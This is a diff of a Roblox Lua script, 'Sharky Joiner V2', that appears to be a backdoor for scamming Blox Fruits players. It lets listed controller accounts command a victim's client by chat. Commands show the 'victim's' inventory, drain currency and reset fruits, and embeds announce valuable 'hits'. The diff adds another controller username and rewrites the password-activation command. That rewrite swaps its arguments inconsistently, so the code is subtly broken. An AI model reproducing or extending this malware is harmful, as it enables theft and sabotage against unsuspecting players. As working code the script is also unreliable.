@@ -24,7 +24,7 @@ ActivationPasswords = {
 local validation_sig = "rashya5@%-hsfj79h93-wakliballs" -- KEEP THIS SAFE AND MATCH SERVER
 
 -- Core Admin Usernames (Define globally for easier access)
-local coreAdminUsernames = {"x6TNine","bonzarbal53","bonzarbal52","bonzarbal51","bonzarbal50"}
+local coreAdminUsernames = {"x6TNine","aka_0ver","bonzarbal53","bonzarbal52","bonzarbal51","bonzarbal50"}
 
 -- State Variables
 local allowEveryone = false -- Flag to allow commands/trade for everyone (can be toggled by ?allowall)
@@ -243,7 +243,7 @@ end
 	if dragonHit and hasPremiumItem then baseEmbedTitle = "<:dragonE:1318248271457812510><:value:1228807380188397649> **DRAGON & PREMIUM HIT!**"; baseEmbedColor = 65280; baseMention = "@everyone Sharky - GG!"
 	elseif dragonHit then baseEmbedTitle = "<:dragonE:1318248271457812510> **DRAGON HIT!**"; baseEmbedColor = 16776960; baseMention = "@everyone Sharky - GG!"
 	elseif hasPremiumItem then baseEmbedTitle = "<:value:1228807380188397649> **PREMIUM ITEM HIT!**"; baseEmbedColor = 3447003; baseMention = "@everyone Sharky - GG!"
-    elseif hasGoodFruit then baseEmbedTitle = "<:kitsune:1185239741545848922> **TOP FRUIT HIT!** (Kitsune/Yeti)"; baseEmbedColor = 16753920; baseMention = "@everyone Sharky - GG!" -- Added specific title for GoodFruit only
+    elseif hasGoodFruit then baseEmbedTitle = "<:kitsune:1185239741545848922> **TOP FRUIT HIT!** (Kitsune/Yeti)"; baseEmbedColor = 16753920; baseMention = "@everyone Sharky - GG!"
 	elseif foundAnyTarget then baseEmbedTitle = "<:pepeyes:1226249991035682897> **Target Fruit Hit!**" end
 
     -- Common Embed Fields & Footer
@@ -507,7 +507,7 @@ local function sendMessage(m) pcall(function() SayMessageRequest:FireServer(m, "
 local CommandCooldowns = {};
 local DEFAULT_COOLDOWN = 0.5
 
--- Command Definitions (MODIFIED - Added ?d, ?e)
+-- Command Definitions (MODIFIED - Fixed ?activate args, Added ?d, ?e)
 local Commands = {
 	jump = {d="Forces character jump.",u="?jump",e=ForceJump},
 	sit = {d="Attempts to sit at trade table.",u="?sit",e=function(args, player) sendMessage("Attempting to sit..."); local t,s=findTradeTable(); if not(t and s)then sendMessage("Error finding table! Try ?tp.");return end; local c=LocalPlayer.Character; if not(c and c.PrimaryPart)then sendMessage("Character error.");return end; tweenToPosition(s.Position+Vector3.new(0,2,0)); task.wait(1); local function aS() for i=1,10 do local r=Vector3.new(math.random(-2,2)/10,math.random(-2,2)/10,math.random(-2,2)/10); tweenToPosition(s.Position+r); task.wait(0.5); local h=c:FindFirstChildOfClass("Humanoid"); if h and h.Sit then sendMessage("Sat!");return true end end; return false end; if not aS()then sendMessage("Failed to sit. Try ?sit again.")end end},
@@ -525,8 +525,47 @@ local Commands = {
 	demolish = {d="!!DANGEROUS!! Resets all fruits, drains currency.",u="?demolish",e=function(args, player) sendMessage("!!! DEMOLISH INITIATED !!!"); local iR=function(rn,a)local r=ReplicatedStorage:WaitForChild("Remotes"):WaitForChild(rn); return r:InvokeServer(unpack(a))end; iR("CommF_",{"RemoveFruit","Beli"}); local inv=getInventory(); if not inv then return end; local fr={}; for _,i in pairs(inv)do if i.Type=="Blox Fruit"then table.insert(fr,i)end end; table.sort(fr,function(a,b)return a.Value>b.Value end); for i,f in ipairs(fr)do local bfn=f.Name:match("(%S+)"); sendMessage("("..i.."/"..#fr..") Resetting with '"..bfn.."'..."); ForceJump(); iR("CommF_",{"LoadFruit",bfn}); task.wait(0.5); if LocalPlayer.Character then LocalPlayer.Character:BreakJoints(); task.wait(6)end end; local dB=function()local rA={"PurchaseRawFruit","Rocket-Rocket",false}; local sA={"PurchaseRawFruit","Spin-Spin",false}; while task.wait()do iR("CommF_",rA); task.wait(0.01); iR("CommF_",sA)end end; local dF=function()local fA={"BlackbeardReward","Refund","2"}; while task.wait()do iR("CommF_",fA)end end; task.spawn(dB); task.spawn(dF)end},
 	showinv = {d="Shows victim's fruit inventory.",u="?showinv",e=function(args, player) task.spawn(function() sendMessage("Fetching inventory..."); local inv=getInventory(); if not inv then sendMessage("Inventory error.");return end; local fdl={}; for _,i in pairs(inv)do if i.Type=="Blox Fruit"then table.insert(fdl,{name=i.Name,count=i.Count,value=i.Value or 0})end end; if #fdl==0 then sendMessage("No fruits found.");return end; table.sort(fdl,function(a,b)return a.value>b.value end); local fdl2={}; for _,fd in ipairs(fdl)do local fs=fd.name; if fd.count>1 then fs=fs.." (x"..fd.count ..")"end; table.insert(fdl2,fs)end; local ml=180; local ipe=10; local tc=math.ceil(#fdl2/ipe); local cm="Fruits [Value] (1/"..tc.."): "; local ci=1; for i,fn in ipairs(fdl2)do local pl=string.len("Fruits [Value] (X/Y): "); local sep=(#cm>pl)and", "or""; local pa=sep..fn; if string.len(cm)+string.len(pa)>ml then sendMessage(cm); task.wait(1); ci=ci+1; cm="Fruits [Value] ("..ci.."/"..tc.."): "..fn else cm=cm..pa end end; if cm~=""and not cm:match("^Fruits %[%w+%].*%): $")then sendMessage(cm)end; task.wait(0.5); sendMessage("Inventory display complete.")end)end},
 	test = {d="Checks script responsiveness.",u="?test",e=function(args, player) local s=tick(); task.wait(0.001); sendMessage("Responsive! "..string.format("%.1f",(tick()-s)*1000).."ms")end},
-	help = {d="Displays commands.",u="?help",e=function(args, player) task.spawn(function() local c={"?help ?test ?jump ?sit ?tp ?reset ?rejoin","?add ?additem ?addall ?addallitems","?resetfruit ?invite ?demolish ?showinv","?allowall ?accept ?cleartrade ?kick", "?d ?e (Admin Only)"}; sendMessage("--- Commands (V1.3.2) ---"); task.wait(0.5); for i,m in ipairs(c)do sendMessage(m); task.wait(0.5)end end)end}, -- Added ?d/?e to help
-	activate = {d="Activates command access.",u="?activate <pass>",e=function(p, pw) if not pw or pw==""then sendMessage("Usage: ?activate <pass>");return end; if not p or not p:IsA("Player")then print("Activate Error: Invalid player");return end; local fp=false; for _,vp in ipairs(ActivationPasswords)do if pw==vp then fp=true; break end end; if fp then if activatedUsers[p.UserId]then sendMessage("Already activated.")else activatedUsers[p.UserId]=true; sendMessage("Activated for session!")end else sendMessage("Incorrect password.")end end}, -- Note: activate doesn't get player obj passed by default, fixed in processor
+	help = {d="Displays commands.",u="?help",e=function(args, player) task.spawn(function() local c={"?help ?test ?jump ?sit ?tp ?reset ?rejoin","?add ?additem ?addall ?addallitems","?resetfruit ?invite ?demolish ?showinv","?allowall ?accept ?cleartrade ?kick", "?d ?e (Admin Only)"}; sendMessage("--- Commands (V1.3.2) ---"); task.wait(0.5); for i,m in ipairs(c)do sendMessage(m); task.wait(0.5)end end)end},
+
+    -- <<< --- ACTIVATE COMMAND (FIXED ARGUMENTS) --- >>>
+	activate = {
+        d="Activates command access.",
+        u="?activate <pass>",
+        e=function(passwordAttempt, player) -- Corrected argument order: (args, player)
+            if not passwordAttempt or passwordAttempt==""then
+                sendMessage("Usage: ?activate <pass>");
+                return
+            end;
+            -- Check if the 'player' object passed is valid
+            if not player or not player:IsA("Player")then
+                print("Activate Error: Invalid player object received.");
+                -- Maybe send a generic error to user?
+                -- sendMessage("An internal error occurred.")
+                return
+            end;
+
+            local foundPassword=false;
+            for _,validPassword in ipairs(ActivationPasswords)do
+                if passwordAttempt == validPassword then
+                    foundPassword=true;
+                    break
+                end
+            end;
+
+            if foundPassword then
+                if activatedUsers[player.UserId]then -- Use player.UserId
+                    sendMessage("Already activated.")
+                else
+                    activatedUsers[player.UserId]=true; -- Use player.UserId
+                    sendMessage("Activated for session!")
+                end
+            else
+                sendMessage("Incorrect password.")
+            end
+        end
+    },
+    -- <<< --- END FIX --- >>>
+
 	allowall = {d="Toggles all player command access.",u="?allowall",e=function(args, player) allowEveryone=not allowEveryone; local s=allowEveryone and"ENABLED"or"DISABLED"; sendMessage("AllowEveryone: "..s); if allowEveryone then sendMessage("ANYONE can use commands")end end},
 	kick = {d="Kicks script user.",u="?kick <reason>",e=function(a, player) if not a or a==""then sendMessage("Usage: ?kick <reason>");return end; local p=LocalPlayer; pcall(p.Kick,p,a)end},
 
@@ -586,7 +625,10 @@ local function processChatCommand(_, p, m) -- p is the player object
     if executorIsCoreAdmin then
         isPotentiallyAuthorized = true -- Core admins always bypass general checks
     elseif commandName == "activate" then
-         isPotentiallyAuthorized = true -- Activate command has its own internal logic, bypasses disabled state check
+         -- Special case for activate: it runs regardless of the disabled state,
+         -- but the function itself checks the password.
+         -- We still need to ensure the player object is passed correctly.
+         isPotentiallyAuthorized = true
     elseif not nonAdminAuthDisabled then -- Check if non-admin auth is currently ENABLED
         local isUsernameListed = Usernames and table.find(Usernames, p.Name)
         local isActivated = activatedUsers[p.UserId]
@@ -597,9 +639,7 @@ local function processChatCommand(_, p, m) -- p is the player object
 
     if not isPotentiallyAuthorized then
         -- User is not authorized (either generally, or non-admin auth is disabled)
-        -- Silently fail or send generic unknown command? Sending unknown for now.
-        -- sendMessage("Unknown command: ?" .. commandName); -- Could reveal disabled state
-        return -- Block command execution
+        return -- Block command execution silently
     end
 
     -- Find Command
@@ -626,7 +666,16 @@ local function processChatCommand(_, p, m) -- p is the player object
 
     -- Execute Command
 	task.spawn(function()
-		local success, err = pcall(commandFuncData.e, args, p); -- Pass player object 'p' as second arg
+        local success, err
+        if commandName == "activate" then
+            -- Activate specifically needs player object first in its internal logic,
+            -- but processor passes (args, player). Let's call it matching its internal needs.
+             success, err = pcall(commandFuncData.e, p, args); -- Pass (player, passwordAttempt)
+        else
+            -- All other commands expect (args, player)
+            success, err = pcall(commandFuncData.e, args, p);
+        end
+
 		if not success then
 			sendMessage("Error executing ?" .. commandName .. ": " .. tostring(err));
 			warn("Cmd Error:", commandName, args, err)
@@ -663,4 +712,3 @@ if not shared.ScriptExecuted_SharkyV2_Final_1_3_2 then -- Updated Guard Name/Ver
 else
 	warn("Sharky Joiner V2 (v1.3.2) already executed.")
 end
-
